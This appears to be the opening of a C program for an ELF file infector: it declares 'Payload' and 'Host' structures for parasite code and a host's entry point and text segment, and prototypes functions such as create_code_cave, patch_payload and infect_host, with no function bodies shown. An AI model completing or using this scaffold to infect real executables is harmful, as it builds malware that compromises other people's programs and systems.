#include<stdio.h>
#include<string.h>
#include<errno.h>
#include<elf.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>

struct Payload
{
	Elf64_Addr parasite_address;
	Elf64_Off parasite_offset;
	uint64_t size;
	uint8_t *parasite_code;
};

struct Host
{
	Elf64_Addr original_entry_point;
	Elf64_Off text_segment_offset;
	Elf64_Off text_segment_end;
	uint64_t size;
	uint8_t *host;
};


void open_map_file(int *fd,char *filename);
void extract_payload();
void create_code_cave();
void patch_payload();
void infect_host();
